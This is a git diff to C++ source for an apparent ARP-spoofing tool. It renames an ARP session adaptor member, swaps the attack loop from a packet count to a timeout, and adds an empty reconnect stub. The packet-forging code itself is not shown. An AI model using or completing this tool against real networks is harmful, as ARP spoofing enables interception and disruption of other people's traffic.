@@ -1,6 +1,7 @@
 #include <optional>
 #include <netinet/in.h>
 #include <iostream>
+#include <ctime>
 #include <pcap.h>
 #include "arp/ARPSessionAdaptor.cpp"
 
@@ -12,7 +13,7 @@ private:
     uint8_t* gateWay;
 
     bool isBroadcast = false;
-    ARPSessionAdaptor* sendArpAdaptor;
+    ARPSessionAdaptor* arpSessionAdaptor;
 
     std::optional<ARPHeader*> processARPPacket(const uint8_t *packet) {
         auto *etherHeader = (EtherHeader *) packet;
@@ -30,7 +31,7 @@ public:
     netInterface(netInterface) {
         if (sessionList) this->sessionList = sessionList.value();
         else this->isBroadcast = true;
-        this->sendArpAdaptor = new ARPSessionAdaptor(netInterface);
+        this->arpSessionAdaptor = new ARPSessionAdaptor(netInterface);
     }
 
     void buildSessions() {
@@ -47,7 +48,7 @@ public:
             auto arpHeader = this->processARPPacket(packet);
 
             if (arpHeader) {
-                if (this->sendArpAdaptor->addSession(*arpHeader.value())) {
+                if (this->arpSessionAdaptor->addSession(*arpHeader.value())) {
                     std::cout << "INFO: Collected ARP sender: " << arpHeader.value()->sender_ip << std::endl;
                     go = false;
                 }
@@ -57,17 +58,23 @@ public:
         std::cout << "INFO: Success scanning sender clients" << std::endl;
     }
 
-    void startARPSpoofing(uint maxAttack, uint delay= 1) {
-        std::cout << "INFO: Start ARP spoofing attack...." << std::endl;
+    void startARPSpoofing(uint sessionTime) {
+        std::cout << "INFO: Start ARP-Spoofing ..." << std::endl;
+
+        auto startTime = std::time(0);
 
         bool go = true;
-        uint attackCount = 0;
         while (go) {
-            std::cout << "[" << attackCount << "]" << " Send attack..." << std::endl;
-            this->sendArpAdaptor->sendARPPacket();
-            attackCount++;
-            if (attackCount > maxAttack and maxAttack != 0) go = false;
+            this->arpSessionAdaptor->sendARPPacket();
+
+            if (startTime < std::time(0)) {
+                go = false;
+            }
         }
 
-        std::cout << "INFO: End ARP spoofing attack" << std::endl;}
+        std::cout << "INFO: End ARP-Spoofing::TimeOut" << std::endl;
+    }
+
+    void reconnectSession(ARPSession session) {
+    }
 };
